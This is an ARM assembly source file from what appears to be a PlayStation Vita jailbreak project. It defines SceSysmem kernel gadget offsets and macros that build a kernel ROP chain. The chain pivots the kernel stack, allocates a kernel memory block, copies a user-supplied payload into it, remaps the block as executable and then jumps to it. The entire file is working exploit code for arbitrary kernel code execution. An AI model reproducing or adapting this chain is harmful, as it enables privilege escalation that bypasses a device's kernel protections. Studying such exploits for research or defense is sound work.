/* krop.S -- kernel rop chain
 *
 * Copyright (C) 2018 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

// Kernel offsets
.equ KSTACK_SIZE,                                 0x1000
.equ KSTACK_DEVCTL_INDATA_OFFSET,                 0x6f8
.equ KSTACK_SYSMEM_OFFSET,                        0x89c
.equ SCE_SYSMEM_OFFSET,                           -0x3e67

// call
.equ SceSysmem_blx_r0,                            0x1fb3f
.equ SceSysmem_blx_r4_pop_r4_pc,                  0x19fb9

// load
.equ SceSysmem_pop_pc,                            0x347
.equ SceSysmem_pop_r0_pc,                         0x31
.equ SceSysmem_pop_r0_r1_r2_r3_r4_pc,             0x258fd
.equ SceSysmem_pop_r3_pc,                         0x1b4d
.equ SceSysmem_pop_r3_r4_r5_r6_r7_pc,             0x103f
.equ SceSysmem_ldr_r0_r0_blx_r3,                  0xd51b

// store
.equ SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc,     0x163d

// move
.equ SceSysmem_mov_r2_r5_blx_r6,                  0x113d7
.equ SceSysmem_movs_r5_r0_blx_r2,                 0xd30d
.equ SceSysmem_mov_sp_r1_blx_r2,                  0x67

// arithmetic
.equ SceSysmem_adds_r0_1_bx_lr,                   0x1a07
.equ SceSysmem_add_r1_sp_bc_mov_r2_r6_blx_r3,     0x1d97d
.equ SceSysmem_sub_r1_r1_r3_bx_lr,                0x86d

// functions
.equ SceSysmem_ksceKernelGetMemBlockBase,         0x1f15
.equ SceSysmem_ksceKernelAllocMemBlock,           0xa521
.equ SceSysmem_ksceKernelRemapBlock,              0xa74d
.equ SceSysmem_ksceKernelMemcpyUserToKernel,      0x825d
.equ SceSysmem_ksceKernelCpuDcacheWritebackRange, 0x22fcd

// misc
.equ SceSysmem_empty_string,                      0x19

// Variables that lie in the kernel stack
.equ payload_code_block,                          0x00
.equ payload_code_blockid,                        0x04

// Max payload size
.equ MAX_PAYLOAD_SIZE,                            0x100000

.macro init_krop dst
  .set krop_chain, \dst
.endm

.macro push base, gadget
  .if \base == 0
    store_vv \gadget, krop_chain
  .elseif \base == 1
    load_add_store krop_chain, sysmem_base, \gadget
  .elseif \base == 2
    load_add_store krop_chain, kstack_base, \gadget
  .elseif \base == 9
    // Dummy
  .endif
  .set krop_chain, krop_chain + 4
.endm

.macro build_krop dst
  // Init krop chain
  init_krop \dst

  // Allocate code block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 1, SceSysmem_empty_string                      // r0
  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW          // r1
  push 0, MAX_PAYLOAD_SIZE                            // r2
  push 0, NULL                                        // r3
  push 1, SceSysmem_ksceKernelAllocMemBlock           // r4
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
  push 2, payload_code_blockid                        // r4
  // Save code blockid
  push 1, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc     // pc
  push 9, 0xDEADBEEF                                  // r4

  // Get code block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_code_blockid                        // r0
  push 2, payload_code_block                          // r1
  push 9, 0xDEADBEEF                                  // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_ksceKernelGetMemBlockBase         // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4

  // Copy payload from user to kernel code block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_code_block                          // r0
  push 0, payload_start                               // r1
  push 0, payload_size                                // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_ksceKernelMemcpyUserToKernel      // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4

  // Mark code block as executable
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_code_blockid                        // r0
  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RX          // r1
  push 9, 0xDEADBEEF                                  // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_ksceKernelRemapBlock              // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4

  // Clean dcache
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_code_block                          // r0
  push 0, MAX_PAYLOAD_SIZE                            // r1
  push 9, 0xDEADBEEF                                  // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_ksceKernelCpuDcacheWritebackRange // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4

  // Execute payload
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc             // pc
  push 2, payload_code_block                          // r0
  push 1, 0                                           // r1
  push 0, framebuf                                    // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // r3
  push 1, SceSysmem_adds_r0_1_bx_lr                   // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                  // pc
  push 9, 0xDEADBEEF                                  // r4
  push 1, SceSysmem_blx_r0                            // pc
.endm

.macro build_pivot_krop dst
  // Init krop chain
  init_krop \dst

  // Kernel stack pivot
  .set difference, (KSTACK_SIZE - OVERWRITE_SIZE) - KSTACK_DEVCTL_INDATA_OFFSET
  push 1, SceSysmem_pop_r3_r4_r5_r6_r7_pc             // pc
  push 1, SceSysmem_pop_r3_pc                         // r3
  push 1, SceSysmem_sub_r1_r1_r3_bx_lr                // r4
  push 9, 0xDEADBEEF                                  // r5
  push 1, SceSysmem_pop_pc                            // r6
  push 9, 0xDEADBEEF                                  // r7
  push 1, SceSysmem_add_r1_sp_bc_mov_r2_r6_blx_r3     // pc
  push 0, 0x1c + 0xbc + difference                    // r3
  push 1, SceSysmem_blx_r4_pop_r4_pc                  // pc
  push 9, 0xDEADBEEF                                  // r4
  push 1, SceSysmem_mov_sp_r1_blx_r2                  // pc
.endm
